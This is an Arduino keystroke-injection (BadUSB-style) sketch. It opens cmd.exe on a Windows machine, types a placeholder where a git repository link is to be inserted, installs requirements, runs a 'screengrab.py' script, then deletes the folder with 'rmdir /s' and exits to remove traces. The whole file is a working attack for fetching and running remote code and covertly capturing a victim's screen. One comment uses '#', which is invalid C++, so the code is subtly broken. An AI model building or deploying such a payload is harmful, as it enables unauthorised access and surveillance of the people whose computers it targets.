#include <Keyboard.h>

void setup() {
  // put your setup code here, to run once:
Keyboard.begin();
delay(4000);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
delay(20);
Keyboard.releaseAll();
delay(50);
Keyboard.print("cmd.exe");
Keyboard.press(KEY_RETURN);
delay(1000);
Keyboard.print("cd Desktop");
Keyboard.releaseAll();
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
Keyboard.print(""); # tu dodaj swój link do gita
Keyboard.releaseAll();
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(3000);
Keyboard.releaseAll();
delay(100);
Keyboard.print("cd Screengrab.py");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
Keyboard.print("pip install -r requirements.txt");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(5000);
Keyboard.print("python screengrab.py");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(13000);
Keyboard.print("cd ..");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
Keyboard.print("rmdir Screengrab.py /s");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
Keyboard.print("y");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(100);
Keyboard.print("exit");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
}

void loop() {
  // put your main code here, to run repeatedly:

}
